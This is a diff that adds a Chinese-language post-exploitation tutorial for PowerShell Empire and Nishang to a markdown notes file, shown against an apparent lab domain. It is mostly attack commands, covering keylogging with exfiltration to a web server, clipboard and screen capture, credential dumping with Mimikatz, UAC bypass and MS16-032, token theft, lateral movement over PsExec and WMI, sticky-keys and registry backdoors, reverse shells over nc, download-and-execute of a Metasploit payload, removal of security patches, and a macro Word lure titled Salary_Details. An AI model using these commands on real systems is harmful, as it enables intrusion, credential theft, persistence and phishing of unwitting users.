@@ -5349,11 +5349,1047 @@ remove stale	//删除失效主机
 
 #### 后信息收集
 
-| 命令 | 功能 |
-| ---- | ---- |
-|      |      |
-|      |      |
-|      |      |
-|      |      |
+使用命令搜索需要使用的模块，这里通过`usemodule collection` 然后键入Tab键查看完整的列表
 
-421
+> 这里需要控制主机后才可以使用
+
+```
+search module
+usemodule collection
+```
+
+![image-20210405130023307](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130023307.png)
+
+这里我们演示几个常用模块：
+
+1. **屏幕截图**
+
+   不需要做多余设置，直接execute可以看到目标主机屏幕截图
+
+   ```
+   usemodule collection/screenshot
+   info
+   ```
+
+   ![image-20210405130314522](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130314522.png)
+
+2. **键盘记录**
+
+   设置保持默认就可以，我们输入execute启动，就开启记录键盘输入了，会自动在`empire/downloads/<AgentName>`下生成一个agent.log，如下图所示
+
+   ```
+   usemodule collection/keylogger
+   info
+   ```
+
+   ![image-20210405130411200](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130411200.png)
+
+   我们打开agent.log可以看到在我们的监控端已经全部记录下来了，虽然不能记录中文，但是大概意思我们还是能看出来的，标点符号也记录了下来，相对来说还是记录英文比较好，如下图所示。
+
+   ![image-20210405130440325](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130440325.png)
+
+   如果我们要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs会显示当前在后台的记录，如果要终止一个记录，可以使用jobs kill JOB_name，这里可以输入jobs kill N7XE38即可停止键盘记录，如下图所示
+
+   ![image-20210405130544533](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130544533.png)
+
+3. **剪贴板记录**
+
+   抓取存储在目标主机Windows剪贴板上的任何内容。模块参数可以设置抓取限制和间隔时间，一般情况下，保持默认设置就可以。
+
+   ```
+   usemodule collection/clipboard_monitor
+   info
+   ```
+
+   我们在目标主机随便COPY一句话，可以看到屏幕已经有结果了，速度还是很快的，如下图所示
+
+   ![image-20210405130644676](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130644676.png)
+
+   同样当前监控模块也可以置于后台，输入jobs会显示当前在后台的记录，如果要终止话同样输入jobs kill JOB_name，如下图所示
+
+   ![image-20210405130736921](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130736921.png)
+
+4. **查找共享**
+
+   将会列出域内所有的共享，可以设置CheckShareAccess选项将只返回可从当前用户上下文中读取的共享，这里保持默认。
+
+   ```
+   usemodule situational_awareness/network/powerview/share_finder
+   ```
+
+   ![image-20210405130853988](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130853988.png)
+
+5. **收集目标主机有用的信息**
+
+   可以查看本机用户，域组成员，最后密码设置时间，剪贴板内容，系统基本系统信息，网络适配器信息，共享信息等等。
+
+   ```
+   usemodule situational_awareness/host/winenum
+   
+   usemodule situational_awareness/host/computerdetails	# 这个需要管理员权限
+   ```
+
+   ![image-20210405130942021](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405130942021.png)
+
+6. **ARP扫描**
+
+   Empire也内置arp扫描模块
+
+   ```
+   usemodule situational_awareness/network/arpscan
+   info
+   ```
+
+   ![image-20210405131124068](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131124068.png)
+
+   这里要设置一下Range参数，输入下列命令设置为要扫描的网段，如下图所示。
+
+   ```
+   set Range 192.168.31.0-192.168.31.254
+   execute
+   ```
+
+   ![image-20210405131146462](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131146462.png)
+
+7. **端口扫描**
+
+   与ARP一样，扫描前需要添加相关信息
+
+   ```
+   usemodule situational_awareness/network/portscan
+   ```
+
+8. **DNS信息获取**
+
+   获取内网中的网段信息
+
+   ```
+   usemodule situational_awareness/network/reverse_dns
+   ```
+
+   ![image-20210405131453802](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131453802.png)
+
+   这里设置一下Range参数，设置你要扫描的IP网段
+
+   ![image-20210405131505715](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131505715.png)
+
+   如果该主机同时有2个网卡，Empire也会显示出来，方便我们寻找边界主机
+
+   另一个模块可以显示出当前内网DNS服务器IP地址
+
+   ```
+   usemodule situational_awareness/host/dnsserver
+   ```
+
+   ![image-20210405131622975](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131622975.png)
+
+9. **查找域管登陆服务器IP**
+
+   我们希望找到域管登陆的机器，然后横向渗透进去，窃取域管权限，从而拿下整个域，而这个模块就是用来查找域管登陆的机器
+
+   ```
+   usemodule situational_awareness/network/powerview/user_hunter
+   info
+   ```
+
+   ![image-20210405131759628](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131759628.png)
+
+   这个模块可以清楚看到哪个用户登录了哪台主机，结果显示域管曾经登录过机器名为WIN7-64.shuteer.testlab,IP地址为192.168.31.251的这台机器上。
+
+   ![image-20210405131826578](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131826578.png)
+
+10. **本地管理组访问模块**
+
+    直接运行execute即可，可以看到有2台计算机。
+
+    ```
+    usemodule situational_awareness/network/powerview/find_localadmin_access
+    ```
+
+    ![image-20210405131928155](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405131928155.png)
+
+11. **获取域控制器**
+
+    通过这个模块来确定我们当前的域控制器，因为我们有了域用户权限，输入execute
+
+    ```
+    usemodulesituational_awareness/network/powerview/get_domain_controller
+    ```
+
+    ![image-20210405132128196](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405132128196.png)
+
+    当前域服务器名为DC
+
+    我们再验证下能否访问域服务器DC的“C$”，同样顺利访问，如下图所示
+
+    ![image-20210405132148918](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405132148918.png)
+
+
+
+#### 提高权限
+
+##### 1.Bypass UAC
+
+利用这个模块，设置Listener参数，运行execute，上线了一个新的反弹。
+
+```
+usemodule privesc/bypassuac
+set Listener test
+back
+```
+
+![image-20210405132504087](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405132504087.png)
+
+回到agents下面，输入list命令，可以看到多了一个agents，带星号的即为提权成功的
+
+![image-20210405132639823](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405132639823.png)
+
+
+
+##### 2.bypassuac_wscript
+
+这个模块大概原理是使用c:\Windows\wscript.exe执行payload，实现管理员权限执行payload，绕过UAC。只适用于系统为Windows 7，目前尚没有对应补丁，部分杀毒软件会有提示。如下图所示，带型号的即为提权成功的。
+
+![image-20210405132735097](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405132735097.png)
+
+
+
+##### 3.ms16-032
+
+Empire自带了MS16-032 (KB3124280) 模块，输入usemodule privesc/ms16-032，只需要设置下Listener，运行提权成功
+
+![image-20210405132755375](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405132755375.png)
+
+
+
+##### 4.PowerUp
+
+Empire内置了PowerUp部分工具，用于系统提权，主要为Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式，输入“usemodule privesc/powerup”然后按Tab键来查看完整列表，如下图所示。
+
+```
+usemodule privesc/powerup
+```
+
+![image-20210405132916636](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405132916636.png)
+
+**4.1AllChecks模块**
+
+如何查找上述漏洞，就要用到这个模块了。和Powersploit下powerup中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞，输入下列命令，如下图所示。
+
+```
+usemodule privesc/powerup/allchecks
+execute
+```
+
+![image-20210405133132154](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405133132154.png)
+
+可以看到，他列出了很多方法，我们可以尝试用第一种方法bypassuac来提权，提权之前我们看下当前agents，可以看到只有一个普通权限，Name为**CD3FRRYCFVTYXN3S**，IP为**192.168.31.251**的客户端，如下图所示
+
+![image-20210405133215774](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405133215774.png)
+
+接着我们输入**bypassuac test**来提权，等几秒钟，就会给我们返回一个更高权限的shell，如下图所示
+
+![image-20210405133226232](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405133226232.png)
+
+我们再次输入agents命令来查看当前agents，可以看到多了一个高权限（带星号）Name为**341CNFUFK3PKUDML**的客户端，如下图所示，提权成功
+
+![image-20210405133256708](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405133256708.png)
+
+**4.2模块使用说明**
+
+AllChecks模块的应用对象如下：
+
+- 任何没有引号的服务路径
+- 任何ACL配置错误的服务（可通过service_ *利用 ）
+- 服务可执行文件上的任何不当权限（可通过service_exe_ *进行利用）
+- 任何剩余的unattend.xml文件
+- 设置AlwaysInstallElevated注册表项
+- 如果有任何Autologon凭证留在注册表中
+- 任何加密的web.config字符串和应用程序池密码
+- 对于任何％PATH％.DLL劫持机会（可通过write_dllhijacker利用）
+
+
+
+##### 5.GPP
+
+在域里面很多都会启用组策略首选项来执行本地密码更改，以便于管理和映像部署。缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取到部署信息。虽然他是采用AES 256加密的，使用usemodule privesc/gpp，如下图所示。
+
+```
+usemodule privesc/gpp
+```
+
+![image-20210405133724975](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405133724975.png)
+
+
+
+#### 横向渗透
+
+##### 1.令牌窃取
+
+使用内置mimikatz获取系统密码，输入命令查看Empire列举的密码
+
+```
+creds
+```
+
+![image-20210405133900601](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405133900601.png)
+
+发现有域用户在此服务器上登陆，此时我们可以窃取域用户身份，然后进行横向移动，首先先来窃取身份，使用命令`pth<ID>`，这里的ID号就是creds下的**CredID**号，我们这里来窃取administrator的身份令牌，执行**Pth 7**命令，如下图所示。
+
+```
+Pth 7
+```
+
+![image-20210405133958253](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405133958253.png)
+
+可以看到进程号为1380，使用steal_token PID命令就窃取了该身份令牌了，如下图所示。
+
+![image-20210405134015315](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405134015315.png)
+
+同样我们也可以在通过PS命令查看当前进程，查看是否有域用户的进程，如下图所示。
+
+![image-20210405134032761](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405134032761.png)
+
+可以看到有域用户的进程，这里我们选用同一个Name为CMD，PID为1380的进程
+
+![image-20210405134236142](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405134236142.png)
+
+同样通过steal_token命令来窃取这个命令，我们先尝试访问域内另一台主机WIN7-X86的“C$”，顺利访问，如下图所示
+
+```
+steal_token
+shell dir \\WIN7-X86\C$
+```
+
+![image-20210405134354016](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405134354016.png)
+
+输入revtoself命令可以将令牌权限恢复到原来的状态
+
+```
+revtoself
+```
+
+![image-20210405134307355](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405134307355.png)
+
+
+
+##### 2.会话注入
+
+我们也可以使用模块来进程注入，获取权限
+
+这里需要设置下Listeners和ProcID这2个参数
+
+```
+usemodule management/psinject
+info
+set Listeners test
+set ProcID 1380
+execute
+```
+
+![image-20210405134634748](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405134634748.png)
+
+
+
+##### 3.Invoke-PsExec
+
+缺点是该工具基本杀毒软件都能检测到，并会留下日志，而且需要开启admin$ 445端口共享。优点是可以直接返回SYSTEM权限。这里我们要演示的是Empire下的Invoke-Psexec模块
+
+使用该模块的前提是我们已经获得本地管理员权限，甚至域管理员账户，然后以此来进一步持续渗透整个内网。
+
+我们测试该模块前看下当前agents，只有一个IP为192.168.31.251，机器名为WIN7-64的服务器
+
+![image-20210405135010508](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135010508.png)
+
+现在使用模块usemodule lateral_movement/invoke_psexec渗透域内另一台机器WIN7-X86，输入info查看设置参数
+
+```
+usemodule lateral_movement/invoke_psexec
+info
+set ComputerName WIN7-X86.shuteer.testlab
+set Listenershuteer
+Execut
+```
+
+![image-20210405135032079](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135032079.png)
+
+输入agents命令查看当前agents，多了一个IP为192.168.31.158，机器名为WIN7-X86的服务器
+
+![image-20210405135130417](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135130417.png)
+
+
+
+##### 4.Invoke-WMI
+
+它比PsExec安全，所有window系统启用该服务，攻击时Windows系统默认不会在日志中记录这些操作，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。但防火墙开启将会无法连接。
+
+```
+usemodule lateral_movement/invoke_wmi
+Set ComputerName WIN7-X86.shuteer.testlab
+Set Listener shuteer
+Execute
+```
+
+![image-20210405135245337](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135245337.png)
+
+
+
+WMI还有一个模块，是使用WMI去设置五个Windows Accessibility可执行文件中任意一个的调试器。这些可执行文件包括sethc.exe（粘滞键，五下shift可触发），narrator.exe（文本转语音，Utilman接口激活）、Utilman.exe（windows辅助管理器，Win+U启用），Osk.exe（虚拟键盘，Utilman接口启用）、Magnify.exe（放大镜，Utilman接口启用）
+
+```
+usemodule lateral_movement/invoke_wmi_debugger
+```
+
+
+
+##### 5.Powershell Remoting
+
+PowerShell remoting是Powershell的远程管理功能，开启Windows远程管理服务WinRM会监听5985端口，该服务默认在Windows Server 2012中是启动的，在Windows Server 2003、2008和2008 R2需要通过手动启动。
+
+如果目标主机启用了PSRemoting，或者拥有启用它的权限的凭据，则可以使用他来进行横向渗透。
+
+```
+usemodule lateral_movement/invoke_psremoting
+```
+
+
+
+#### 后门
+
+创建后门可以方便我们以后再次控制系统
+
+##### 1.权限持久性劫持shift后门
+
+这里需要设置几个参数，运行后，**在目标主机远程登录窗口按5次shift即可触发后门**，有一个黑框一闪而过，如下图所示
+
+```
+usemodule lateral_movement/invoke_wmi_debuggerinfo
+info
+set Listener  shuteer
+set ComputerName  WIN7-64.shuteer.testlab
+set TargetBinary sethc.exe
+execute
+```
+
+![image-20210405135621132](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135621132.png)
+
+这里看我们的Empire已经有反弹代理上线，这里为了截图我按了3回shift后门，所以弹回来3个代理
+
+![image-20210405135652185](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135652185.png)
+
+**注意：**sethc.exe这里有几个可以替换的选项
+
+- Utilman.exe（快捷键为: Win + U）
+- osk.exe（屏幕上的键盘Win + U启动再选择）
+- Narrator.exe (启动讲述人Win + U启动再选择)
+- Magnify.exe(放大镜Win + U启动再选择）
+
+
+
+##### 2.注册表注入后门
+
+运行后会在目标主机启动项添加一个命令，需要设置几个参数
+
+```
+usemodule persistence/userland/registry
+set Listener shuteer
+set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run
+execute
+```
+
+运行后当我们**登陆系统时候就会运行**，反弹回来
+
+![image-20210405135832830](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135832830.png)
+
+我们去目标机主机看看启动项下面有没有添加东西，竟然没有，真是厉害，如下图所示。
+
+![image-20210405135846628](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405135846628.png)
+
+
+
+##### 3.计划任务获得系统权限
+
+在实际渗透中，运行该模块时杀软会有提示。这里要设置DailyTime，Listener这2个参数，等设置的时间到后，成功返回一个高权限的shell。
+
+```
+usemodule persistence/elevated/schtasks
+Set DailyTime 16:17
+Set Listener test
+execute
+```
+
+![image-20210405140013415](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405140013415.png)
+
+我们输入agents命令来查看当前agents，可以看到又多了一个SYSTEM权限
+
+这里如果把set RegPath 的参数改为HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run，那么就会在16:17分添加一个注册表注入后门
+
+
+
+#### Empire反弹回Metasploit
+
+实际渗透中，当拿到Webshell上传的MSF客户端无法绕过目标机杀软时，可以使用PowerShell来绕过也可以执行Empire的payload来绕过，成功之后再使用Empire的模块将其反弹回Metasploit
+
+这里修改2个参数，Lhost和Lport，Lhost修改为msf所在主机ip
+
+```
+usemodule code_execution/invoke_shellcode
+Set Lhost 192.168.31.247
+Set Lport 4444
+```
+
+在MSF上设置监听，命令如下，运行后，就可以收到Empire反弹回来的shell了
+
+```
+Use exploit/multi/handler
+Set payloadwindows/meterpreter/reverse_https
+Set Lhost 192.168.31.247
+Set lport 4444
+Run
+```
+
+
+
+### Nishang工具
+
+Nishang是一款针对PowerShell的渗透工具，Nishang要在Powershell 3.0以上的环境中才可以正常使用，也就是说在Windows7下默认是有点小问题的，因为win7下自带的环境是PowerShell 2.0
+
+下载地址：https://github.com/samratashok/nishang
+
+
+
+既然是PowerShell框架，那自然是要导入的，导入模块之后输入命令查看Nishang都有哪些模块
+
+```
+Get–Command–Module nishang
+```
+
+![image-20210405141101539](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405141101539.png)
+
+模块及其对应功能：
+
+![QQ截图20210405141158](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/QQ%E6%88%AA%E5%9B%BE20210405141158.png)
+
+列出本机的信息
+
+```
+Get-Information
+```
+
+
+
+#### 后信息收集模块
+
+看上面的目录结构图，就知道哪里去找要用的东西了。挑一些好用的模块来说
+
+##### 1.Check-VM 
+
+检测该主机是不是虚拟机，例如本机器就是一个虚拟机
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-47f621b12fbe97c30533415d53654533_hd.jpg)
+
+##### 2.Invoke-CredentialsPhish
+
+这个脚本就是欺骗用户，让用户输入密码，不给正确密码就不给关，只能强制干掉进程。
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-984b43cf7aa569db8d5763d7b113c9db_hd.jpg)
+
+##### 3.Copy-VSS
+
+这个脚本利用Volume Shadow Copy服务复制sam文件，如果这个脚本运行在了DC机上，ntds.dit和 SYSTEM hive也能被拷贝出来
+
+```
+PS > Copy-VSS [文件地址] #默认是在当前文件夹下面
+PS > Copy-VSS-DestinationDir C:temp #指定保存文件路径
+```
+
+##### 4.FireBuster FireListener扫描器
+
+对内网进行扫描，打开本地监听，然后远程传送数据，打包给FireListener
+
+首先在本机输入命令运行FireListener
+
+```
+FireListener 130-150
+```
+
+接着在目标机器输入
+
+```
+FireBuster 192.168.12.107 130-150 -Verbose
+```
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-98584c96e762562c0786f83cd816f5d9_hd.jpg)
+
+##### 5.Keylogger键盘记录
+
+从来没有见过这么牛的键盘记录模块，查看这个模块的帮助文件
+
+```
+Get-Help .Keylogger.ps1 -full
+```
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-b913cb4f5e6f743fd40da8b2c550bf29_hd.jpg)
+
+一共有四种执行方式
+
+- ```
+  PS > .Keylogger.ps1 //直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下key文件中
+  ```
+
+- ```
+  PS > .Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //-CheckURL参数会去检查所给出的网页之中是否包含 -MagicString后的字符串，如果存在的话就停止使用记录。
+  ```
+
+- ```
+  PS > .Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php //将记录指定发送给一个可以记录Post请求的Web服务器
+  ```
+
+- ```
+  PS > .Keylogger.ps1 -persist //实现持久化记录（重启后依然进行记录）
+  ```
+
+**例如第一种**
+
+执行命令`.\Gather\Keylogger.ps1`之后，默认会在Temp目录生成一个key.log文件。之后在输入命令
+
+```
+Parse_Keys.key.log.parsed.txt
+```
+
+![在这里插入图片描述](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/20201201150705700.png)
+
+##### 6.Invoke-Mimikatz
+
+抓取密码
+
+```
+Invoke-Mimikatz -DumpCreds
+```
+
+##### 7.Get-PassHashes
+
+这个脚本在Administratore的权限下可以Dump出密码哈希值,使得不再需要 SYSTEM权限就可以Dump了
+
+```
+Get-PassHashes
+```
+
+##### 8.获取用户的密码提示信息
+
+```
+Get-PassHints
+```
+
+
+
+#### 反弹shell
+
+各式各样的shell，任由你反弹，跟msf一样
+
+##### 1.基于TCP协议的PowerShell交互式shell
+
+Invoke-PowerShellTcp是基于TCP协议的PowerShell**正向连接或反向连接Shell**
+
+参数如下
+
+- **IPAddress \<String>**：选择-Reverse选项时表示需要连接的IP地址
+- **Port \<Int32>**：选择-Reverse选项时表示需要连接的端口，选择-Bind选项时表示需要监听的端口。
+- **Reverse [\<SwitchParameter>]**：反向连接
+- **Bind [\<SwitchParameter>]**：正向连接
+
+**反向连接**
+
+使用NC监听本地端口3333，NC下执行
+
+```
+nc -lvp 3333
+```
+
+然后在目标机器PowerShell输入命令，反弹到192.168.12.110
+
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.12.110 -Port 3333
+```
+
+![image-20210405144654213](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405144654213.png)
+
+**正向连接**
+
+在目标机器PowerShell输入命令，监听3333端口
+
+```
+Invoke-PowerShellTcp -Bind -Port 3333
+```
+
+本机连接目标主机192.168.12.103，NC下执行
+
+```
+nc -nv 192.168.12.103 3333
+```
+
+![image-20210405144858181](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405144858181.png)
+
+选择来连接方式
+
+> 当目标在外网而你在内网的时候，用正向连接。
+> 当目标在内网而你在外网的时候，用反向连接。
+> 如果都在外网，则没有区别，两种方式皆可。
+
+
+
+##### 2.基于UDP协议的PowerShell交互式Shell
+
+Invoke-PowerShellUdp是基于UDP协议的PowerShell正向连接或反向连接Shell
+
+这里的使用方法和上面相同，由于基于UDP协议，所以nc的命令有所不同。
+
+```
+正向连接命令：nc-nvu 192.168.12.103 3333
+反向连接命令：nc-lup 3333
+```
+
+推荐这个网站——https://www.explainshell.com，可以使用它查看包括Windows和Linux的在内的各种命令解析
+
+
+
+##### 3.基于HTTP和HTTPS协议的PowerShell交互式Shell
+
+Invoke-PoshRatHttp和Invoke-PoshRatHttps是基于HTTP协议和HTTPS协议的PowerShell反向连接Shell。除了基于TCP和UDP协议的Shell,Nishang还支持基于HTTP和HTTPS协议的Shell，两种脚本的使用方法一样。
+
+```
+HTTP:Invoke-PoshRatHttp-IPAddress 192.168.12.103-Port 3333
+
+HTTPS:Invoke-PoshRatHttps-IPAddress 192.168.12.103-Port 3333
+```
+
+执行完之后会生成一道命令，HTTP和HTTPS一样，这里我只演示是HTTP
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-0733357e971ffa8062dc68b3d0caa33c_hd.jpg)
+
+将这道命令拖入cmd中执行，之后命令行消失，在本机Powershell下返回了一个会话
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-f91ba3e66dafb296a372bb4d84cb8b98_hd.jpg)
+
+
+
+#### 后门
+
+该模块存放于nishangAntak-WebShell目录下，就是一个ASPX的大马，可以使用这个WebShell编码执行脚本，上传、下载文件。比单纯的cmd强大很多。功能齐全，日aspx的站必备的东西
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-6a89ebada215da6872410241f1fd71b5_hd.jpg)
+
+该模块的执行方式很简单，上传WebShell后的使用方法和操作PowerShell执行窗口一样，上传和下载文件时填写好对应路径，单击“Upload the File”“Download”按钮即可
+
+
+
+#### 提权
+
+##### 1.下载执行
+
+Download_Execute是Nishang中的下载执行脚本，**常用于下载文本文件，然后将其转换为可执行文件执行**
+
+使用以下命令可利用Nishang中的exetotext.ps1脚本将Metasploit生成的木马端msf.exe更改为文本文件msf.txt
+
+```
+PS C:Usersroot> ExetoText c: msf.exe c: msf.txt
+
+Converted file written to c: msf.txt
+```
+
+然后输入以下命令，调用Download_Execute脚本下载并执行该文本文件。
+
+```
+PS C:Usersroot> Download_Execute http://192.168.110.128/msf.txt
+```
+
+这时在Metasploit的监听端口就可以成功获得反弹回来的Shell
+
+
+
+##### 2.Bypass UAC
+
+Invoke-PsUACme 看名字就知道是干嘛的了。绕过UAC
+
+> UAC（User Account Control 用户账户控制）是微软引进的安全策略，要求用户在执行可能会影响计算机运行或其他用户设置的操作之前，提供权限或管理员密码。
+>
+> 分为高、中、低三个等级。高等级的进程具有管理员权限
+
+输入GET-HELP来看看帮助信息
+
+```
+GET-HELP
+```
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-438c9411f868ce9233f3200a0af2e103_hd.jpg)
+
+具体的执行方式如下
+
+```
+PS > Invoke-PsUACme-Verbose ##使用Sysprep方法并执行默认的Payload
+```
+
+```
+PS > Invoke-PsUACme-method oobe –Verbose ##使用oobe方法并执行默认的Payload
+```
+
+```
+PS > Invoke-PsUACme-method oobe-Payload "powershell-windowstyle hidden-e Your EncodedPayload" ##使用-Payload参数可以自行指定执行的Payload
+```
+
+还可以使用-PayloadPath参数指定一个Payload路径，在默认情况下，Payload会在C:WindowsTempcmd.bat结束。还可以使用-CustomDll64（64位）或-CustomDLL32（32位）参数自定义一个DLL文件
+
+尝试本地Bypass UAC：
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-fbc4364d6b16c88b6f7aa21e47b22c00_hd.jpg)
+
+
+
+##### 3.删除补丁
+
+```
+PS > Remove-Update All ##移除目标机器上的所有更新
+```
+
+```
+PS > Remove-Update Security ##移除目标机器上的所有与安全相关更新
+```
+
+```
+PS > Remove-Update KB2761226 ##移除指定编号的更新
+```
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-9b68a9458e58b0b271fad23676042da1_hd.jpg)
+
+
+
+##### 4.端口扫描，爆破
+
+使用命令查看帮助信息
+
+```
+Get-Help Invoke-PortScan -full
+```
+
+- -StartAddress 开始的IP地址
+- -EndAddress 结束的IP地址
+- -ResolveHost 是否解析主机名
+- -ScanPort要不要进行端口扫描
+- -Port 要扫描的端口
+- -TimeOut 超时时间
+
+对本地局域网进行扫描：
+
+```
+Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost
+```
+
+**弱口令爆破**
+
+以使用命令查看帮助信息
+
+```
+Get-Help Invoke-BruteForce -full
+```
+
+- -ComputerName 对应服务的计算机名
+- -UserList 用户名字典
+- -PasswordList 密码字典
+- -Service 服务（默认为：SQL）
+- -StopOnSuccess 匹配一个后停止
+- -Delay 延迟时间
+
+
+
+##### 5.嗅探
+
+内网嗅探，动静太大了，但是，实在没办法的时候，不得不说，这是一个办法。
+
+在靶机上执行
+
+```
+Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999
+```
+
+监听机器上执行
+
+```
+netcat -lvvp 9999
+```
+
+
+
+##### 6.屏幕窃取
+
+**反向连接**
+
+目标主机输入命令，将远程的画面传送到192.168.250.172的3333端口
+
+```
+Show-TargetScreen-Reverse-IPAddress 192.168.250.172-Port 3333
+```
+
+监听机输入命令，之后访问本机的9999端口，就可以窃取到目标机屏幕了
+
+```
+netcat-nlvp 3333 |netcat-nlvp 9999
+```
+
+**正向连接**
+
+目标主机输入命令
+
+```
+Show-TargetScreen-Bind-Port 3333
+```
+
+监听机输入命令
+
+```
+netcat-nv 192.168.250.37 3333 |netcat-lnvp 9999
+```
+
+参数如下
+
+- -IPAddress 后面加IP地址（反向链接需要）
+- -Port 加端口
+- -Bind 正向连接
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-51ea67ab881bfdea2bd303a4a8abf727_hd.jpg)
+
+
+
+##### 7.生成木马
+
+Nishang中还有各种脚本，可以感染各种文件，如HTA、Word，用于执行PowerShell脚本
+
+各个脚本的使用方法基本相同，这里以生成受感染的Word为例
+
+首先输入以下命令，在本地监听4444端口
+
+```
+Nc –lvp 4444
+```
+
+接着制作Word文件，打开nishangShellsInvoke-PowerShellTcpOneLine.ps1这个文件，复制第三行的内容，有一个TcpClient的参数，这里就是远程连接的地址了
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-7c6866627314da484e2cac45d839a042_hd.jpg)
+
+这里需要将这个地址和端口改成本机的IP和监听的端口，改完以后复制该代码，在命令行下输入以下命令
+
+```
+Invoke-Encode -DataToEncode '复制的代码' -IsString -PostScript
+```
+
+![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/v2-bd6a12f470e2004d4b0d8e90d24fc325_hd.jpg)
+
+执行完成之后会在当前目录下生成两个文件。一个是encoded.txt 另一个是encodedcommand.txt。之后执行
+
+```
+Out-Word -PayloadScript .encodedcommand.txt
+```
+
+然后当前文件夹下会生成一个名为Salary_Details的doc文件。目标用户打开Word以后，会反弹Shell，在启用宏的计算机上没有任何提示，未启用宏的计算机会有启用宏的提示。获取反弹的PowerShell后可以很容易地升级到Metasploit的Meterpreter
+
+**命令行参数解释**
+
+- -Payload 后面直接加payload，但是注意引号的闭合
+- -PayloadURL 传入远程的payload进行生成
+- -PayloadScript 指定本地的脚本进行生成
+- -Arguments 之后加要执行的函数。（payload之中有的函数）
